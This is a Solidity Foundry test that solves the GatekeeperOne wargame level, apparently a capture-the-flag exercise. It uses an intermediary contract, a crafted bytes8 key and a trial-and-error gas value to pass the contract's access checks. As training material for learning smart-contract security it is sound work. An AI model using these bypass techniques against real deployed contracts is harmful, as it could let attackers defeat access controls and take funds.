pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperOne.sol";

contract KeyOne {
    function enter(GatekeeperOne gate, bytes8 data) external returns (bool) {
        return gate.enter(data);
    }
}

contract AttackGatekeeperq is Test {
    GatekeeperOne public target;
    address payable public hombre = payable(address(0x69));

    function setUp() public {
        target = new GatekeeperOne();
    }

    function makeKey() internal pure returns (bytes8) {
        uint256 _o = ((1 << 0x30) | uint256(uint160(0x1f38)));
        uint256 o = _o << (0xc0);
        bytes32 bytesO = bytes32(o);
        bytes8 bytes8O = bytes8(bytesO);
        return bytes8O;
    }

    function testSolidityGatekeeperOne() public {
        KeyOne portal = new KeyOne();

        bytes8 key = makeKey();

        uint256 gas = 203_024; // trial and error
        vm.prank(hombre);
        bool entered = portal.enter{gas: gas}(target, key);
        assertEq(entered, true);
    }
}
